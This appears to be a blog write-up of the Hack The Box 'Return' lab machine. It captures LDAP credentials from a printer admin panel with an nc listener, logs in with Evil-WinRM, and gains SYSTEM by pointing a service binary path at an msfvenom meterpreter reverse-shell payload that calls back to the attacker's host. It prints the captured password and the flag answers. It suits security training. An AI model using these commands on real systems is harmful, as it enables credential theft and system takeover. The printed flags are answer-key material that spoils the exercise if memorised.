---
title: 'Return'
date: '2026-09-14'
excerpt: 'Easy - Windows'
prog: 'Hack The Box Machines - September 2026'
type: 'machines'
---

<div class="writeup-header">
<div class="writeup-header-text">
<div class="writeup-org">Hack The Box</div>
<h1 class="writeup-title">Return</h1>
<div class="writeup-date">September 2026 &middot; Machines</div>
</div>
</div>
<p class="lead mb-4">Return is an easy difficulty Windows machine featuring a network printer administration panel that stores LDAP credentials. These credentials can be captured by inputting a malicious LDAP server which allows obtaining foothold on the server through the WinRM service. User found to be part of a privilege group which further exploited to gain system access.</p>

<h4 class="mb-3">Tasks</h4>
<p class="mb-2"><strong>Question 1:</strong> Running an Nmap scan reveals port 445 open on the remote machine. What is the service that is commonly found on this port?</p>
<p class="mb-3">We run <code>nmap -sC -sV -A [TARGET_IP] -Pn</code>.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@pwnbox7]─[~]
└──╼ [★]$ nmap -sC -sV -A 10.129.95.241 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-13 23:32 EDT
Nmap scan report for 10.129.95.241
Host is up (0.18s latency).
Not shown: 987 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HTB Printer Admin Panel
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-14 03:58:49Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-09-14T03:59:03
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 26m21s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.88 seconds
```

<p class="mb-5"><strong>Answer:</strong> SMB</p>
<br />


<p class="mb-2"><strong>Question 2:</strong> Which port is typically used by the LDAP service?</p>
<p class="mb-3">The Nmap scan shows that LDAP service is open on port 389.</p>
<p class="mb-5"><strong>Answer:</strong> 389</p>
<br />


<p class="mb-2"><strong>Question 3:</strong> What is the username leaked by a page on the website on TCP 80?</p>
<p class="mb-3">Navigating to <code>http://[TARGET_IP]/settings.php</code> in the web browser reveals the information needed.</p>

![Return1](/images/return_hackthebox_image1.png)

<p class="mb-5"><strong>Answer:</strong> svc-printer</p>
<br />


<p class="mb-2"><strong>Question 4:</strong> In the settings page mentioned previously, which field can we alter in order to potentially instruct the printer to connect back to our own machine?</p>
<p class="mb-5"><strong>Answer:</strong> Server Address</p>
<br />


<p class="mb-2"><strong>Question 5:</strong> After we instruct the printer to connect back to our own machine on the default LDAP port, what is the password that the printer attempts to authenticate with?</p>
<p class="mb-3">We run <code>sudo nc -lvnp 389</code> and update the Server Address field from <code>printer.return.local</code> to our local machine's IP address.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@pwnbox7]─[~]
└──╼ [★]$ nc -lvnp 389
nc: Permission denied
┌─[au-free-2]─[10.10.14.224]─[aaronamran@pwnbox7]─[~]
└──╼ [★]$ sudo nc -lvnp 389
Listening on 0.0.0.0 389
Connection received on 10.129.95.241 59294
0*`%return\svc-printer
                       1edFg43012!!
```                       

<p class="mb-5"><strong>Answer:</strong> 1edFg43012!!</p>
<br />


<p class="mb-2"><strong>Question 6:</strong> Submit the flag located on the svc-printer user's desktop.</p>
<p class="mb-3">Now that we have the credentials <code>svc-printer</code>:<code>1edFg43012!!</code>, we can login to the machine using Evil-WinRM, by running <code>evil-winrm -i [TARGET_IP] -u svc-printer -p '1edFg43012!!'</code>.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@pwnbox7]─[~]
└──╼ [★]$ evil-winrm -i 10.129.95.241 -u svc-printer -p '1edFg43012!!'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-printer\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> ls


    Directory: C:\Users\svc-printer\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/13/2026   8:57 PM             34 user.txt


*Evil-WinRM* PS C:\Users\svc-printer\Desktop> cat user.txt
4c6a7487027d7baf3a75ec7ad7900174
```

<p class="mb-5"><strong>Answer:</strong> 4c6a7487027d7baf3a75ec7ad7900174</p>
<br />


<p class="mb-2"><strong>Question 7:</strong> After connecting to the system and running the "whoami /groups" command, you will notice that the user is a member of quite a few groups. One of these groups can potentially be used to escalate our privileges. What is the name of this group?</p>

```console
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
```

<p class="mb-5"><strong>Answer:</strong> Server Operators</p>
<br />


<p class="mb-2"><strong>Question 8:</strong> Submit the flag located on the Administrator user's desktop.</p>
<p class="mb-3">We use <code>msfvenom</code> to generate a meterpreter reverse shell executable payload file for the Windows remote host.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@pwnbox7]─[~]
└──╼ [★]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.224 LPORT=1337 -f exe > shell-x86.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 7168 bytes
```

<p class="mb-3">In the current Evil-WinRM shell, we upload the executable on the remote host.</p>

```console
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> upload shell-x86.exe
                                        
Info: Uploading /home/aaronamran/shell-x86.exe to C:\Users\svc-printer\Desktop\shell-x86.exe
                                        
Data: 9556 bytes of 9556 bytes copied
                                        
Info: Upload successful!
```

<p class="mb-3">Now we use Metasploit console to configure a listener for a reverse shell session on the Windows target. Then we run the listener.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@pwnbox7]─[~]
└──╼ [★]$ msfconsole -q
[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 10.10.14.224
LHOST => 10.10.14.224
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 1337
LPORT => 1337
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
[*] Started reverse TCP handler on 10.10.14.224:1337 
[*] Sending stage (190534 bytes) to 10.129.95.241
```

<p class="mb-3">Using the existing shell, we modify the service binary path to obtain the reverse shell. Then we run <code>sc.exe start vss</code> to activate the reverse shell.</p>

```console
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> sc.exe config vss binPath="C:\Users\svc-printer\Desktop\shell-x86.exe"
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> sc.exe start vss
```

<p class="mb-3">Since Metasploit listener is active, we should have a Meterpreter session open, where we can read get the flag.</p>

```console
[*] Meterpreter session 1 opened (10.10.14.224:1337 -> 10.129.95.241:60897) at 2026-09-14 00:00:30 -0400

(Meterpreter 1)(C:\Windows\system32) > shell
Process 1528 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3A0C-428E

 Directory of C:\Users\Administrator\Desktop

09/27/2021  04:22 AM    <DIR>          .
09/27/2021  04:22 AM    <DIR>          ..
09/13/2026  08:57 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   8,837,193,728 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
ed33ab1e18439c87d69bfbef53311fd6
```

<p class="mb-5"><strong>Answer:</strong> ed33ab1e18439c87d69bfbef53311fd6</p>


<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">September 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>